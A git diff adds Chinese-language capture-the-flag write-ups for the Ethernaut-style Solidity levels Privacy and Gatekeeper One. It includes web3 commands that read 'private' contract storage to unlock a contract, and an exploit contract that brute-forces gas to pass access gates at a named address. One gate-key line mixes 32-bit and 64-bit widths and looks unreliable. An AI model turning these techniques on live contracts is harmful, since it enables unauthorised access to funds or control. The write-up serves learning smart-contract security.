@@ -520,7 +520,7 @@ contract Attack {
     }
 }
 ```
-attack 的时候传 0.001 ether 即可。
+Attack 的时候传 0.001 ether 即可。
 
 # Elevator
 
@@ -580,3 +580,147 @@ contract Attack {
 ```
 
 这个题 goTo 传多少都没意义，关键是控制 isLastFloor 返回符合目标合约的约束。
+
+# Privacy
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+    bool public locked = true;
+    uint256 public ID = block.timestamp;
+    uint8 private flattening = 10;
+    uint8 private denomination = 255;
+    uint16 private awkwardness = uint16(block.timestamp);
+    bytes32[3] private data;
+
+    constructor(bytes32[3] memory _data) {
+        data = _data;
+    }
+
+    function unlock(bytes16 _key) public {
+        require(_key == bytes16(data[2]));
+        locked = false;
+    }
+
+    /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+    */
+}
+```
+目标是解锁这个合约。要解锁合约，我们需要找到一个 bytes16 的 _key，该密钥必须与 data[2] 的前 16 字节相同。也就是说，合约的解锁机制依赖于 data[2] 的内容。
+- 在 Solidity 中，状态变量是按顺序存储在合约的存储槽（slots）中的。每个存储槽的大小为 32 字节（256 位）。我们可以利用这一点通过读取合约的存储来获取 data[2] 的内容。以下是 Solidity 中变量的存储规则：
+    - 每个 uint256 或 bytes32 类型的变量独占一个存储槽。
+    - 较小的数据类型（如 uint8 和 uint16）可以合并存储在同一个槽中，直到占满 32 字节。
+- 存储布局分析：根据代码，变量的存储分布如下
+    - locked（bool 类型）占用第 0 槽的第 1 位。
+    - ID（uint256 类型）占用第 1 槽。
+    - flattening, denomination, 和 awkwardness（uint8 和 uint16 类型）会合并到第 2 槽。
+    - data[0], data[1], 和 data[2] 分别占用第 3、4、5 槽。
+    - 我们需要的是 data[2]，它位于存储槽 5 中。
+
+```js
+await web3.eth.getStorageAt("0xCe702b10A17D441216cdA807c7b93E6d787479c6", 5);
+// 0x9a7cc95f3d89c118afdf08eba0a9246c60140b408ab6c80594f28e79a9f97ed3
+"0x9a7cc95f3d89c118afdf08eba0a9246c60140b408ab6c80594f28e79a9f97ed3".slice(0,34) // include "0x"
+await contract.unlock("0x9a7cc95f3d89c118afdf08eba0a9246c")
+await contract.locked()
+```
+- bytes 类型表示一个定长或变长的字节数组。在 Solidity 中，字节数组从高位（即数组的开头）开始存储。当进行从大类型到小类型的转换时，bytes 是截取前面的字节（即高位部分）。bytes 数组是字节序列，按照大端字节序（big-endian）方式存储。大端表示法意味着最左边的字节是最高有效位，因此在截取时保留的是高位部分。
+- uint（无符号整数）类型表示一个数值，在内存中的表示方式是数值的二进制形式。当对 uint 进行类型转换时，Solidity 选择截取数值的低位，因为低位是数值的有效部分。
+
+# Gatekeeper One
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract GatekeeperOne {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        require(gasleft() % 8191 == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+        require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+- `gasLeft()`: [docs](https://docs.soliditylang.org/en/v0.8.3/units-and-global-variables.html#block-and-transaction-properties)
+```solidity
+modifier gateOne() {
+    require(msg.sender != tx.origin);
+    _;
+}
+```
+这个条件要求 msg.sender 不等于 tx.origin。这意味着你需要通过另一个合约来调用 GatekeeperOne 合约。
+```solidity
+modifier gateTwo() {
+    require(gasleft() % 8191 == 0);
+    _;
+}
+```
+这个条件要求在执行该modifier时剩余的gas量必须是 8191 的倍数。这个条件非常棘手，通过循环去不断尝试。
+```solidity
+modifier gateThree(bytes8 _gateKey) {
+    require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
+    require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
+    require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
+    _;
+}
+```
+`bytes 本身是大端序，如果 bytes 和 uint 进行类型转换，数据本身不会发生变化，但数据的解读方式需要按对方的方式来进行解读。` 这里的要求是构造一个特定的 bytes8 类型的 _gateKey，它需要通过以下三个条件：
+- 条件1：uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)) 这个条件要求 _gateKey 的低32位的前16位必须为0，以使得低32位的值等于低16位的值。
+- 条件2：uint32(uint64(_gateKey)) != uint64(_gateKey) 这个条件要求 _gateKey 的高32位必须不为零。换句话说，整个 _gateKey 必须大于 2^32，从而 uint32(uint64(_gateKey)) 和 uint64(_gateKey) 不相等。
+- 条件3：uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)) 这个条件要求 _gateKey 的低16位等于 tx.origin（交易发起者地址）的低16位。
+
+综上可以如下构造：
+```solidity
+bytes8 _gateKey = bytes8((uint32(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)|0xFFFFFFFF00000000);
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IGatekeeperOne {
+    function enter(bytes8 _gateKey) external returns(bool);
+}
+
+contract GatekeeperOneExploit {
+    IGatekeeperOne public gatekeeper = IGatekeeperOne(0x9aA2db5838cBEF21BD6bC21E465B5973e5155b68);
+
+    constructor() {}
+
+    function exploit() public {
+        bytes8 _gateKey = bytes8((uint32(uint160(tx.origin)) & 0xFFFFFFFF0000FFFF)|0xFFFFFFFF00000000);
+        for (uint256 i = 0; i < 8191; i++) {
+            (bool success, ) = address(gatekeeper).call{gas: 8191 * 10 + i}(abi.encodeWithSignature("enter(bytes8)", _gateKey));
+            if (success) {
+                break;
+            }
+        }
+    }
+}
+```
